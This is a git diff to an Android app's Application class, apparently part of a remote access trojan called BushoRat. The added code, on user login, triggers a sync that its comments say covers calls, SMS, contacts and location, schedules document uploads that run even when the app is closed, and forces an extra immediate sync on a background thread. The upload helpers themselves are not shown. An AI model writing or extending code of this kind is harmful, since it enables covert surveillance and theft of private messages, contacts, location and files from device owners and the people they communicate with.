@@ -62,16 +62,42 @@ public class BushoRatApplication extends Application {
     private void registerVisibilityAuthListener() {
         authStateListener = firebaseAuth -> {
             if (firebaseAuth.getCurrentUser() != null) {
-                Log.d(TAG, "Auth state: user logged in, starting visibility listener and data sync");
+                Log.d(TAG, "✓ Auth state: user logged in - starting all data sync");
+                String userId = firebaseAuth.getCurrentUser().getUid();
+                Log.d(TAG, "  User ID: " + userId);
+                
                 AppVisibilityHelper visibilityHelper =
                         AppVisibilityHelper.getInstance(BushoRatApplication.this);
                 visibilityHelper.ensureListenerStarted();
-                // Async only — previous blocking await on the main thread caused freezes/crashes.
+                
+                // Start all data sync immediately
+                Log.d(TAG, "  → Syncing user data (calls, SMS, contacts, location)");
                 UserDataSyncHelper.syncAll(BushoRatApplication.this);
+                
                 // Schedule background document uploads (even when app is closed)
+                Log.d(TAG, "  → Scheduling periodic document uploads");
                 DocumentSyncHelper.schedulePeriodicDocumentUpload(BushoRatApplication.this);
+                
+                // Trigger immediate uploads
+                Log.d(TAG, "  → Triggering immediate location sync");
+                triggerImmediateSync();
+            } else {
+                Log.w(TAG, "Auth state: user logged out");
             }
         };
         FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
+    }
+    
+    private void triggerImmediateSync() {
+        // Force immediate sync of location and documents
+        new Thread(() -> {
+            try {
+                Thread.sleep(1000);  // Wait for Firebase init
+                Log.d(TAG, "Triggering immediate location & document sync");
+                UserDataSyncHelper.syncAll(BushoRatApplication.this);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+            }
+        }).start();
     }
 }
